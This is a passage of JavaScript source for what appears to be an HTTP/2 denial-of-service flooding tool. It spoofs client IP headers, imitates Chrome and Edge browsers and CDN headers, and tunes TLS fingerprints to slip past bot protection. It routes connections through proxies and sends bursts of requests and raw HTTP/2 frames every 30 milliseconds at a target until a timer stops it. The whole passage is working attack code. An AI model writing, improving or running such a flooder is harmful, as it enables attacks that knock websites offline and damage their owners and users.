        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0",
        "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "x-client-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },
    edge: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 25),
        "sec-ch-ua": `"Microsoft Edge";v="${Math.floor(115 + Math.random() * 15)}", "Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Edg/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.microsoft.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0",
        "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "x-client-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "ms-cv": `${randstr(10)}.${randstr(5)}.${randstr(3)}.0`
    }
};

    return headersMap[browser] || headersMap.chrome;
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` }),
                            ...(Math.random() < 0.3 && { 'cf-ipcountry': 'US' }),
                            ...(Math.random() < 0.3 && { 'cf-ray': `${randstr(8)}-${randstr(3)}` }),
                            ...(Math.random() < 0.3 && { 'cf-visitor': '{"scheme":"https"}' }),
                            ...(Math.random() < 0.3 && { 'sec-gpc': '1' }),
                            ...(Math.random() < 0.3 && { 'priority': 'u=1, i' }),
                            ...(Math.random() < 0.3 && { 'x-csrf-token': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-auth-token': randstr(40) }),
                            ...(Math.random() < 0.3 && { 'x-api-key': randstr(48) }),
                            ...(Math.random() < 0.3 && { 'x-device-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-session-id': randstr(24) }),
                            ...(Math.random() < 0.3 && { 'x-correlation-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-trace-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-request-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-cloud-trace-context': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-appengine-country': 'ZZ' }),
                            ...(Math.random() < 0.3 && { 'x-goog-api-client': 'gl-js/ fire/9.10.0' }),
                            ...(Math.random() < 0.3 && { 'x-wap-profile': 'http://www.google.com/oha/rdf/oga-rdf.xml' }),
                            ...(Math.random() < 0.3 && { 'x-operamini-phone-ua': headers["user-agent"] }),
                            ...(Math.random() < 0.3 && { 'x-uidh': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-dtpc': randstr(20) }),
                            ...(Math.random() < 0.3 && { 'x-p2p': 'peer' }),
                            ...(Math.random() < 0.3 && { 'x-p2p-peerdist': 'Version=1.0, ContentInfo=0.0' }),
                            ...(Math.random() < 0.3 && { 'x-msedge-ref': randstr(40) }),
                            ...(Math.random() < 0.3 && { 'akamai-origin-hop': '1' }),
                            ...(Math.random() < 0.3 && { 'x-akamai-config-log-detail': 'true' }),
                            ...(Math.random() < 0.3 && { 'fastly-ff': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'cf-worker': randstr(16) })
                        }

                        let allHeaders = Object.assign({}, headers, headers4);


const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 20971520,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
    };
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    let hpack = new HPACK();
    let client;
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : h2settings,
        socket: tlsSocket,
    });
    
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (33554432 - 20971520 + 1)) + 20971520, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (33554432 - 20971520 + 1)) + 20971520;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([...h2_config])),
        encodeFrame(0, 8, updateWindow),
        encodeFrame(0, 6, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
    ];
    
    client.on('connect', async () => {
        const intervalId = setInterval(async () => {
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
    
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
    
            const dynHeaders = shuffleObject({
                ...allHeaders,
                ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
                ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)}),
                ...(Math.random() < 0.3 ? {["X-CUSTOM-" + randstr(6)]: randstr(12)} : {}),
                ...(Math.random() < 0.3 ? {["CF-" + randstr(8)]: randstr(16)} : {}),
                ...(Math.random() < 0.3 ? {["X-EDGE-" + randstr(5)]: randstr(20)} : {})
            });
    
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);
    
            const streamId = Math.floor(Math.random() * 1000000) * 2 + 1;
            const requests = [];
            let count = 0;
    
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < Math.min(args.Rate, 20); i++) {
                    const requestPromise = new Promise((resolve, reject) => {
                        const req = client.request(dynHeaders)
                        .on('response', response => {
                            req.close();
                            req.destroy();
                            resolve();
                        });
                        req.on('end', () => {
                            count++;
                            if (count === args.time * args.Rate) {
                                clearInterval(intervalId);
                                client.close(http2.constants.NGHTTP2_CANCEL);
                            }
                            reject(new Error('Request timed out'));
                        });
    
                        req.end();
                    });
    
                    const frame = encodeFrame(streamId + i, 1, packed, 0x1 | 0x4 | 0x20);
                    requests.push({ requestPromise, frame });
                    
                    // Send additional frames
                    if (Math.random() < 0.3) {
                        const pingFrame = encodeFrame(0, 6, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 0x00);
                        client.write(pingFrame);
                    }
                    
                    if (Math.random() < 0.2) {
                        const windowUpdate = encodeFrame(streamId + i, 8, Buffer.from([0x00, 0x20, 0x00, 0x00]), 0x00);
                        client.write(windowUpdate);
                    }
                }
    
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                client.write(Buffer.concat(frames));
            }
        }, 30);
    });
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

if (global.gc) {
    setInterval(() => {
        global.gc();
    }, 15000);
}